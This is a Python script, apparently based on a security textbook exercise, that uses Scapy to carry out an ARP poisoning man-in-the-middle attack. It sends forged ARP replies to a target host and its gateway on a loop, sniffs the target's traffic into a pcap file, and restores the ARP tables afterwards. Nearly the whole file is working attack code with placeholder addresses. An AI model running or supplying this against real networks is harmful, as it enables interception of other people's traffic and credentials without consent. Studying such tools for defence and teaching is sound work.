from scapy.all import *
import os
import sys
import threading
import signal
from scapy.layers.l2 import ARP
from scapy.layers.l2 import Ether



interface = "enter interface here"
target_ip = "enter target IP here"
gateway_ip = "enter gateway IP here"
packet_count = 1000
gateway_mac = "enter MAC here"
target_mac = "enter MAC here"

#set out interface
conf.iface = interface

#turn off output
conf.verb = 0

print(f"[*] Setting up {interface}")

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    #slightly diff methos using send

    print("[*] Restoring target...")
    # Create ARP packet
    gateway_arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac)

    # Send ARP packet 5 times
    send([gateway_arp_packet]*5)
    # Create ARP packet
    arp_packet = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac)

    # Send ARP packet 5 times
    send([arp_packet]*5)

    #signals main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def poison_target(gateway_ip, gateway_mac,target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Running the ARP poisoning. CTRL-C to stop")
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

            print("[*] ARP poisonig attack finished.")
            return

#start poison thread

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip,target_mac))
poison_thread.start()
try:
    print(f"[*] Starting sniffer for {packet_count} packets.")

    bpf_filter = "ip hosts %s"% target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface = interface)

    #write out the captured packets
    wrpcap('arper.pcap', packets)

    #restore the network
    restore_target(gateway_ip, gateway_mac, target_ip,target_mac)

except KeyboardInterrupt:
    #restore the network
    restore_target(gateway_ip, gateway_mac, target_ip,target_mac)
    sys.exit(0)

